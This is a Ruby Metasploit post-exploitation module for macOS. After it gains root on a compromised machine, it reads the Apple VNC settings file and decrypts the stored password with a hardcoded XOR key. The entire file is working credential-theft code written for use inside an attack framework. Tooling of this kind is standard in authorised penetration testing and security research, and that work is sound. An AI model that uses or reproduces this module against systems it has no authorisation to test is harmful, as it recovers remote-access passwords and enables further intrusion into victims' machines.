##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::OSX::Priv
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OS X Display Apple VNC Password',
        'Description'   => %q{
            This module show Apple VNC Password from Mac OS X High Sierra.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Kevin Gonzalvo <interhack[at]gmail.com>'],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ "meterpreter", "shell" ]
      ))

  end

  def decrypt_hash(hash)
    if hash == nil or hash.empty?
      return nil
    end

    aux = ["1734516E8BA8C5E2FF1C39567390ADCA"].pack('H*')
    fixedkey = aux.unpack('C*')

    str_pw = ["#{hash}"].pack('H*')
    array_pwd = str_pw.unpack('C*')
    str = ''

    for data in fixedkey;
      str += (data ^ array_pwd.shift).chr
    end
    return str
  end

  def get_file(filename)
    begin
      client.fs.file.stat(filename)
      config = client.fs.file.new(filename,'r')
      value = config.read
      return value
    rescue
      return nil
    end
  end

  def run
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = cmd_exec("hostname")
    end

    print_status("Running module against #{host}")
    unless is_root?
      fail_with(Failure::NoAccess, 'It is necessary to be root!')
    end
    print_status("This session is running as root!")
    print_status("Checking VNC Password...")
    vncsettings_path = '/Library/Preferences/com.apple.VNCSettings.txt'
    passwd_encrypt = get_file("#{vncsettings_path}")
    final_passwd = decrypt_hash("#{passwd_encrypt}")
    if !final_passwd.nil?
      print_good("Password Found: #{final_passwd}")
    else
      print_error("Password not found")
    end
  end
end
